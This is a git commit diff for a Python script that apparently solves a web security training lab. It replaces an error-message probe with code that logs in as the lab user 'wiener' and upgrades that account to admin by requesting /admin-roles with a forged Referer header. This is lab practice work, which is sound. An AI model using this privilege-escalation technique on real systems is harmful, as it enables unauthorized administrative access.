9861818e4dc4c7ec2ba8622c08484a985a246582
SoTraore <107843654+SoTraore@users.noreply.github.com>
2023-09-14 04:42:34 +0200

    Final solution of broken access control labs

--- web_acad/broken_authentification/lab13.py
+++ web_acad/broken_authentification/lab13.py
@@ -9,14 +9,25 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 proxies = {"http":"http://127.0.0.1:8087", "https":"http://127.0.0.1:8087"}
 
 def broken_authentification_exploit(session, url) :
-    exploit_url = url+"/product?productId=1'"
-    r = session.get(exploit_url, verify=False, proxies=proxies)
+  
+    login_url = url+"/login"
+    data = {"username":"wiener", "password":"peter"}
+    r = session.post(login_url, data=data, verify=False, proxies=proxies)
     
-    if "Internal Server Error" in r.text :
-        print("The error message occur great!")
-        print(r.text)
+    if "Log out" in r.text :
+        print("(+) The wiener user has logged in successfully!")
+        upgrade_url = url + '/admin-roles?username=wiener&action=upgrade'
+        headers = {"Referer" : url+'/admin'}
+        r = session.get(upgrade_url, headers=headers, verify=False, proxies=proxies)
+        
+        if 'Admin panel' in r.text :
+            print("(+) The wiener user has been successfully upgraded.")
+        else :
+            print("(-) The wiener user could not be upgraded.")
+            sys.exit(-1)
     else :
-        print("Failed to exploit the error message!")
+        print("Failed to login  as the wiener user.")
+        sys.exit(-1)
 
 if __name__ == "__main__" :
     try :
